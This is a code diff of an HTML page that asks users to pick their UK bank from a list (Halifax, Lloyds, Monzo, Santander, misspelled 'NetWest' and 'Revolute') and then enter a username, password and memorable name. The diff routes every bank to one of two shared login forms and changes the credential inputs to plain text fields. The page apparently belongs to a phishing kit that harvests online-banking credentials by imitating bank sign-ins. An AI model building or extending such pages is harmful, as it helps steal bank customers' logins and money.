@@ -92,18 +92,18 @@
     <p class="page-title">Please select your Bank</p>
     <p class="page-sub">Choose your bank to continue</p>
     <ul class="list">
-      <li onclick="goTo('page-blue-form')"><span class="sign-name">Halifax</span><span class="arrow">›</span></li>
-      <li onclick="goTo('page-green-form')"><span class="sign-name">Lloyds</span><span class="arrow">›</span></li>
-       <li><span class="sign-name">Monzo</span><span class="arrow">›</span></li>
-       <li><span class="sign-name""sign-name">NetWest</span><span class="arrow">›</span></li>
-       <li><span class="sign-name">TSB</span><span class="arrow">›</span></li>
-       <li><span class="sign-name">Metro Bank</span><span class="arrow">›</span></li>
-       <li><span class="sign-name">Santander</span><span class="arrow">›</span></li>
-       <li><span class="sign-name">Royal Bank of Scotland</span><span class="arrow">›</span></li>
-       <li><span class="sign-name">Bank of Scotland</span><span class="arrow">›</span></li>
-       <li><span class="sign-name">Revolute</span><span class="arrow">›</span></li>
-       <li><span class="sign-name">Wise</span><span class="arrow">›</span></li>
-       <li><span class="sign-name">Others</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Lloyds</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Halifax</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Monzo</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">NetWest</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">TSB</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Metro Bank</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Santander</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Royal Bank of Scotland</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Bank of Scotland</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Revolute</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Wise</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Others</span><span class="arrow">›</span></li>
     </ul>
   </div>
 
@@ -126,14 +126,14 @@
         <div class="errmsg" id="b-e-user">&#9888; Please enter a username.</div>
       </div>
       <div class="fg">
-        <label for="b-age">Password</label>
-        <input type="number" id="b-age" class="blue-inp" min="1" max="120" placeholder="Enter your Password" />
-        <div class="errmsg" id="b-e-age">&#9888; Please enter a valid Password.</div>
+        <label for="g-age">Password</label>
+        <input type="text" id="g-age" class="green-inp" placeholder="Enter your Password" autocomplete="off" />
+        <div class="errmsg" id="g-e-age">&#9888; Please enter your Password.</div>
       </div>
       <div class="fg">
-        <label for="b-email">Memorable name</label>
-        <input type="email" id="b-email" class="blue-inp" placeholder="Enter your memorable name" autocomplete="off" />
-        <div class="errmsg" id="b-e-email">&#9888; Please enter a valid memorable name.</div>
+        <label for="g-email">Memorable name</label>
+        <input type="text" id="g-email" class="green-inp" placeholder="Enter your Memorable name" autocomplete="off" />
+        <div class="errmsg" id="g-e-email">&#9888; Please enter your Memorable name</div>
       </div>
       <div class="save-row blue-cb">
         <input type="checkbox" id="b-save" />
